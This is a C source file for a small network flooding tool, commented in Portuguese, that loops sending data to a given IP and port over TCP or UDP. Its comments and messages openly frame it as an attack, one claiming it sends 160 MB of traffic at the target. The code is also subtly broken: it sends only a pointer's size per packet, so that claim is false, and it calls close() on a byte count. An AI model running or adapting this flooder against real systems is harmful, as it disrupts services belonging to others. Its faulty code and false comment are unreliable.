#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
    int main(int argc, char *argv[]){
		if(argc != 4){
		    printf("use: ./treec <ip> <porta> <tcp/udp>\n");	
		    exit(EXIT_FAILURE);
		}
		int cnx = 0, sock = 0;
		// essa bagaça gera 160 MB de trafego pra cima do alvo
		long long int size = sizeof(int) * 4096 * 4096;
		long long int *bytes_size = (long long int *) malloc(sizeof(size)*10);
		if(bytes_size == NULL){
		    perror("Acabou espaço");
		    exit(EXIT_FAILURE);	
		} 
		
		struct sockaddr_in addr;
		addr.sin_family = AF_INET;
		addr.sin_port = htons(atoi(argv[2]));
		addr.sin_addr.s_addr = inet_addr(argv[1]);
		do{
		    if(strcmp(argv[3], "tcp") == 0){
			    sock = socket(AF_INET, SOCK_STREAM, 0);
			    if(sock < 0){
				    perror("Socket error");
				    exit(EXIT_FAILURE);	
			    }
		        connect(sock, (struct sockaddr *)&addr, sizeof(addr));
		        cnx = send(sock, bytes_size, sizeof(bytes_size), 0);
		        printf("Enviando: %d bytes, espera um pouco...\n", cnx);
		        close(cnx);
		        close(sock);
					
			}
			else if(strcmp(argv[3], "udp")== 0){
			    sock = socket(AF_INET, SOCK_DGRAM, 0);
			    if(sock < 0){
				    perror("Socket error");
				    exit(EXIT_FAILURE);	
				}
				
			    cnx = sendto(sock, bytes_size, sizeof(bytes_size), 0, (struct sockaddr *)&addr, sizeof(addr));
			
		        printf("Enviado: %d bytes, atacando por UDP...\n", cnx);		    
		        close(cnx);
		        close(sock);	
			}
		}while(cnx != -1);
		free(bytes_size);
		bytes_size = NULL;
		printf("Desconectou...\n");
	    return EXIT_SUCCESS;	
	}